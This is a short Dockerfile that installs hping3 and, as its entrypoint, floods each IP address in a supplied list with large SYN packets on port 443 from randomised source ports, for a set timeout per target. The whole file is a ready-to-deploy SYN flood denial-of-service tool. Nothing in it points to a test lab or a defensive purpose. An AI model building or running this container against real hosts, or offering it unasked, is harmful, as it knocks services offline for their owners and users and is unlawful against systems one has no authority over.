FROM ubuntu:22.04

ARG TIMEOUT=60
ARG IP_LIST

ENV TIMEOUT=${TIMEOUT}
ENV IP_LIST=${IP_LIST}

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
    && apt-get install -y hping3 coreutils \
    && rm -rf /var/lib/apt/lists/*

ENTRYPOINT ["bash", "-c", "\
IFS=',' read -ra IPS <<< \"${IP_LIST}\"; \
for ip in \"${IPS[@]}\"; do \
  timeout ${TIMEOUT}s hping3 -S --flood -V -d 1400 -p 443 -s 1000-65535 \"$ip\" || true; \
done \
"]